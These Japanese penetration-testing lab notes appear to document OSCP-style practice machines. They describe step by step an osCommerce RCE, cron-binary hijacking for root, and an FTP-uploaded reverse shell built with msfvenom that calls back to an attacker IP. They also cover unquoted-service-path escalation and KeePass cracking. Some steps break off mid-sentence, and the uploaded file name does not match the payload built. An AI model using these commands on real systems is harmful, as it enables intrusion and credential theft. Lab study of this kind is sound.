途中までしか終わらなかった。

# VM15

1. osCommerce Online Merchant v2.3.4.1を使っていることから、[44374 - Exploit-DB](https://www.exploit-db.com/exploits/44374)を使ってRCEし、内部に親友

2. 0.0.0.0で動作していたFroxlorがあったので、`/froxlor/lib/userdata.inc.php`に保存されているSQLの認証情報を抽出
	- 127.0.0.1で動作していなくても、FWによって遮断されていて内部からならアクセスできるサービスは要注目

3. Froxlorのデータベースにアクセスしたところ、\Froloxlor\Cronというテーブルがあり、その中にCronjobの一覧が保存されていた

4. cronを列挙すると、rootでFroxlorとありパット見は何が実行されているかわからないし確認できないが、ステップ３で確認したCRONテーブルにあった一つの実行可能ファイルを書き換え、root

---

# VM14

1. UDPスキャンの結果、`tftpd`という、認証不要でファイル転送が可能なプロトコルが動作していたので、ファイルを列挙
```sh
nmap -n -Pn -sU -p69 -sV --script tftp-enum $TargetIP
```

2. 入手したファイルに、Umbracoアップグレード用のFTP認証情報や、sipXcomの認証情報を発見


---

# VM18

1. FTPが動作している、かつ、ほかのポートでUmbracoが動作していたため、[[#VM14]]で入手した認証情報でFTPログインしたところ、以下のような構成であった
```sh
ftp> ls
229 Entering Extended Passive Mode (|||63862|)
150 Starting data transfer.
drwxrwxrwx 1 ftp ftp               0 Nov 30  2022 aspnet_client
-rw-rw-rw- 1 ftp ftp             703 Nov 29  2022 iisstart.htm
-rw-rw-rw- 1 ftp ftp           99710 Nov 29  2022 iisstart.png
-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 security.txt
drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
```

2. iisstart.htm (iisのデフォルトページ) と umbracoの２つがあり、かつ、`/etc/hosts`に以下のように登録してそれぞれFQDNとTLD+1でアクセスしたところ、umbracoとIISに振り分けられたので、バーチャルホストと推定（[[👻Gobuster#補足：バーチャルホストとは]]）
```sh
192.168.1.20 tokyo07.skylark.com skylark.com
```

3. umbracoは`/bin/Debug/net6.0/publish`があり、Net 6+の比較的新しい環境で動作しており、一方でIISは直でweb rootであったため、ASP.net framework（古い）と推定し、aspx ペイロードをアップ（[[Web Shell#ASP / ASP.NET (IIS)]]）
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=443 -f aspx -o reverse.aspx
```
```sh
ftp > put reverse.php
ftp > ls
229 Entering Extended Passive Mode (|||63862|)
150 Starting data transfer.
drwxrwxrwx 1 ftp ftp               0 Nov 30  2022 aspnet_client
-rw-rw-rw- 1 ftp ftp             703 Nov 29  2022 iisstart.htm
-rw-rw-rw- 1 ftp ftp           99710 Nov 29  2022 iisstart.png
-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 security.txt
drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 reverse.php
```

4. 以下のURL（TLD+1：IISの方）でアクセスしたらIISとしてリバースシェル獲得
```
http://skylark.jp:24680/reverse.aspx
```

5. 内部でサービスを列挙したところ、クオテーションに囲まれていないサービスを発見したので、エクスプロイトして権限昇格（[[💥Windows Privilege Escalation#Unquoted Service Pathのエクスプロイト方法]]）
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName
```

6. Administrator に権限昇格後、C:\Users\j_local\Desktop にpasswords.kdbxがあったため、keepass2johnでクラックし、squidの認証情報を入手
	- **反省**：パスワードのクラックは、fasttrack→rockyouの流れ

---

# VM19

1. VM16でsquidが動作していた、かつ、VM16のため、FoxyProxyとproxychainsに登録のうえ、内部NW側のインターフェース